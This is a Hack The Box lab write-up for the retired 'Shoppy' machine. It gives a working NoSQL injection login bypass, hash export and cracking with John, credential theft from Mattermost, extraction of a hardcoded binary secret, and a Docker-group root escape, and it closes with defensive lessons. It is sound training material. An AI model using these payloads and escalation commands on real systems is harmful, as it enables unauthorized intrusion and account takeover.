---
title: "Hack The Box — Shoppy"
summary: "Shoppy uses NoSQL injection to expose user hashes, Mattermost to leak SSH credentials, a hardcoded password manager secret, and Docker access to reach root."
platform: "Hack The Box"
contentType: "machine"
publicationPolicy: "retired"
difficulty: "Easy"
os: "Linux"
solvedAt: 2026-11-21
publishedAt: 2026-11-21
tags:
  - web-security
  - nosql-injection
  - password-cracking
  - mattermost
  - credential-disclosure
  - reverse-engineering
  - docker
  - privilege-escalation
tools:
  - Nmap
  - ffuf
  - John the Ripper
  - Mattermost
  - SSH
  - GNU strings
  - Docker
cves: []
htbUrl: "https://app.hackthebox.com/machines/Shoppy"
cover: "/images/writeups/hackthebox/machines/shoppy/cover.png"
coverAlt: "Hack The Box Shoppy machine logo showing a green shopping basket inside a green circle"
featured: false
draft: false
---

> This write-up documents an authorized Hack The Box lab. The [official Shoppy page](https://www.hackthebox.com/machines/shoppy) identifies it as a **Retired Machine**. Flag values, VPN addresses, and credentials are omitted. Each credential is recoverable by following the steps below in your own lab instance.

## Executive summary

Shoppy's web application passes user input into a MongoDB query without safely constraining it. A JavaScript expression in the login form bypasses authentication; the same technique in the user search exports password hashes. Cracking `josh`'s hash opens a Mattermost virtual host, where a channel reveals SSH credentials for `jaeger`. A sudo rule lets `jaeger` run a password manager as `deploy`. Its hardcoded master password unlocks `deploy`'s credentials. Membership in the `docker` group then allows a container to mount the host filesystem and read the root flag.

## Target information

| Item | Value |
| --- | --- |
| Target | Shoppy |
| Platform | Hack The Box |
| Difficulty | Easy |
| Operating system | Linux |
| Publication policy | [Retired, confirmed by Hack The Box](https://www.hackthebox.com/machines/shoppy) |
| Main weaknesses | NoSQL injection, exposed hashes, credentials in chat, hardcoded secret, Docker group access |

Use the IP assigned to **your** Shoppy instance. It can change when the machine is restarted:

```bash
export TARGET_IP='<YOUR_HTB_TARGET_IP>'
```

## Enumeration

An all-port TCP scan with default scripts and service detection found three open ports:

```bash
nmap "$TARGET_IP" -T3 -sC -sV -p-
```

```text
22/tcp   open  ssh   OpenSSH 8.4p1 Debian
80/tcp   open  http  nginx 1.23.1
9093/tcp open  http  Golang net/http server
```

The HTTP probe on port 80 redirected to `http://shoppy.htb`. Add the name to Kali's hosts file before browsing:

```bash
printf '%s shoppy.htb\n' "$TARGET_IP" | sudo tee -a /etc/hosts
```

The home page is a coming-soon page. Enumerating routes reveals `/login` and `/admin`; the latter redirects to the login form before authentication. For example:

```bash
ffuf -u 'http://shoppy.htb/FUZZ' \
  -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \
  -fc 404
```

Port `9093` serves Go/Prometheus-style metrics. It is useful context, but the web application on port 80 is the route used here.

### Find the second virtual host

The nginx front end also routes requests by the HTTP `Host` header. A virtual-host search finds `mattermost.shoppy.htb`. Filter the 169-byte response returned for unknown hostnames:

```bash
ffuf -u "http://$TARGET_IP/" \
  -H 'Host: FUZZ.shoppy.htb' \
  -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt \
  -fs 169
```

Expected finding: `mattermost`. Add it to `/etc/hosts`:

```bash
printf '%s mattermost.shoppy.htb\n' "$TARGET_IP" | sudo tee -a /etc/hosts
```

If the response length differs in your instance, first request a deliberately nonexistent host and use **its** size as the `-fs` value.

### Findings

| Evidence | Why it mattered |
| --- | --- |
| `/login` and `/admin` on `shoppy.htb` | They expose the application authentication path. |
| `mattermost.shoppy.htb` | It offers another place to test credentials recovered from the shop. |
| SSH on port 22 | Credentials disclosed later can be tested against the host. |
| Metrics on port 9093 | It identifies another service, but no exploit was needed there. |

## Initial access

### Bypass the shop login

Open `http://shoppy.htb/login`. In the **username** field, enter the following expression and use any value for the password:

```text
admin' || '1'=='1
```

The leading `admin` names an existing account. The injected `|| '1'=='1` makes the query condition true. A successful login redirects to `/admin`; a failed attempt returns to `/login` with a wrong-credentials message. The payload belongs in the form field, so the browser handles URL encoding automatically.

### Export the users and crack Josh's hash

Select **Search for users** in the admin panel. Enter the same payload in the search field, press Enter, and select **Download export**. The export contains both `admin` and `josh`, including a password hash for each. The relevant lab hash is:

```text
josh:<32_CHARACTER_HASH_FROM_EXPORT>
```

Save the `username:hash` pair from **your export** and test the MD5 hash against Kali's `rockyou.txt` wordlist:

```bash
printf '%s\n' 'josh:<HASH_FROM_EXPORT>' > josh.hash
john --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-MD5 josh.hash
john --show --format=Raw-MD5 josh.hash
```

Replace `<HASH_FROM_EXPORT>` with `josh`'s 32-character password value from the JSON before running John. If the Kali wordlist is still compressed, extract `/usr/share/wordlists/rockyou.txt.gz` first. The `username:hash` format makes the recovered password's owner unambiguous.

### Use Mattermost to reach SSH

Open `http://mattermost.shoppy.htb` and sign in as `josh` using the password John recovered. In the **Deploy Machine** channel, a message exposes `jaeger`'s SSH credential. Copy its password from that message into your notes for this lab:

```text
username: jaeger
password: <PASSWORD_FROM_MATTERMOST>
```

Connect to the target and confirm the account:

```bash
ssh jaeger@"$TARGET_IP"
# Enter the password from the Deploy Machine channel.
id
cat ~/user.txt
```

The flag value should be submitted to HTB, not copied into a public write-up.

## Privilege escalation

### From jaeger to deploy

In the SSH session, inspect sudo permissions and the available files in `deploy`'s home directory:

```bash
sudo -l
ls -l /home/deploy
```

The sudo rule allows `jaeger` to execute one binary as `deploy`:

```text
(deploy) /home/deploy/password-manager
```

The binary is readable, while its source and credential file are not readable as `jaeger`. It asks for a *master password*. This prompt accepts a password, not shell commands. For example, entering `whoami` returns `Access denied`.

GNU `strings` can inspect 16-bit little-endian character sequences in the binary:

```bash
strings -el /home/deploy/password-manager
```

The output contains a single, readable six-character candidate. This is the hardcoded master password; inspecting `main` in a decompiler also shows its characters assembled one by one. Run the manager under the permitted sudo identity and enter that candidate **when its own prompt appears**:

```bash
sudo -u deploy /home/deploy/password-manager
# If sudo asks, enter jaeger's password from Mattermost.
# At "Please enter your master password:", enter the candidate from strings -el.
```

The manager prints the `deploy` credential. Switch user and inspect group membership:

```bash
su deploy
# Enter deploy's password printed by the manager.
id
docker images
```

`id` shows that `deploy` belongs to the `docker` group. The machine has an `alpine` image available, so no image download is required.

### From deploy to root through Docker

The `docker` group can issue commands to the root-owned Docker daemon. Mount the host's `/` at `/mnt` inside a container, then use `chroot` to run a shell against that filesystem:

```bash
docker run --rm -it -v /:/mnt alpine chroot /mnt sh
id
cat /root/root.txt
```

The final `id` reports `uid=0(root)`, and the root flag is readable. Submit its value to HTB without publishing it.

## What did not work

Entering `whoami` at the password manager's master-password prompt failed. The input is checked against a fixed secret; it is not evaluated as a shell command. Inspecting the binary with `strings -el` supplied that secret and allowed the permitted sudo command to disclose `deploy`'s credentials.

## Attack path

1. Scan ports 22, 80, and 9093; resolve the `shoppy.htb` virtual host.
2. Discover `/login` and bypass authentication with a NoSQL expression.
3. Inject the same expression into user search, export hashes, and crack `josh`'s MD5 hash.
4. Find the Mattermost virtual host, sign in as `josh`, and read `jaeger`'s SSH credential.
5. Use `jaeger`'s permitted sudo command and recover the password manager's hardcoded master password.
6. Switch to `deploy`, confirm Docker group membership, and mount the host filesystem to reach root.

## Lessons learned

- A NoSQL backend still needs strict input handling. Keep user input as data, constrain query shapes, and avoid constructing executable query expressions from it.
- A user search should never export password hashes. Limit returned fields and verify authorization at the data-access layer.
- Chat channels are not a safe credential store. The Mattermost disclosure turned a cracked application password into host access.
- Hardcoding a secret in a compiled binary does not protect it from inspection. Use a proper secret store and narrow the sudo permission to the task actually needed.
- Rootful Docker group membership grants broad control over the host. Restrict access to the Docker socket and avoid treating the group as a low-privilege convenience.

## References

- [Hack The Box — Shoppy (official Retired machine page)](https://www.hackthebox.com/machines/shoppy)
- [0xdf's Shoppy walkthrough](https://0xdf.gitlab.io/2023/01/14/htb-shoppy.html)
- [GNU Binutils documentation: `strings`](https://sourceware.org/binutils/docs/binutils/strings.html)
- [Docker documentation: Docker daemon attack surface](https://docs.docker.com/engine/security/#docker-daemon-attack-surface)
